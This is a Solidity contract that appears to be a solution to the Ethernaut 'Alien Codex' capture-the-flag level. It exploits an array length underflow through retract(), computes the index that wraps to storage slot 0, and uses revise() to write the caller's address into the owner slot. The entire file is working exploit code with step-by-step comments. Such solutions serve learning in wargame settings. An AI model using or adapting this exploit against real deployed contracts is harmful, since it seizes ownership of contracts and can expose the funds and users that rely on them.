// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint, bytes32) external;
}

contract AlienCodexAttacker {
    IAlienCodex public challenge;

    constructor(address challengeAddress) {
        challenge = IAlienCodex(challengeAddress);       
    } 

    function attack() public {
        challenge.makeContact(); //Pass modifier
        challenge.retract(); //Underflows array, take control of storage
        
        //the slot where the array is declared only stores the length of the array
        //this gives us the slot where array storage starts
        uint256 n = uint256(keccak256(abi.encode(uint256(1))));
        uint i; //The index that overrides slot 0

        //Disable checked math (ignore underflow error)
        unchecked {
          //Calculate index
          i -= n;
        }
        //Update slot 0 to our address
        challenge.revise(i, bytes32(uint256(uint160(msg.sender))));
    } 
}